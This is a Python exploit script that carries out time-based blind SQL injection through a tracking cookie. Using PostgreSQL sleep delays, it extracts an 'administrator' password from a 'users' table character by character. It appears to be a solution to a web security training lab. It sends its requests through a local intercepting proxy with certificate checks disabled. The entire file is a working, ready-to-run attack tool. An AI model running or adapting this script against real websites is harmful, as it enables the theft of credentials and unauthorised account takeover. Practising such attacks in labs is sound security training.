import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = "'|| (SELECT CASE WHEN (username='administrator' and ascii(substring(password,%s,1))='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --" % (i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':'KSDkUIfAQrJAA9ZX'+sql_payload_encoded, 'session':'HYA1TchUjhA3WJdLcHc4ag5v6GZ0L8EV'}
            r =  requests.get(url, cookies=cookies,verify=False,proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Retreiving administrator password.....")
    sqli_password(url)

if __name__ == "__main__":
    main()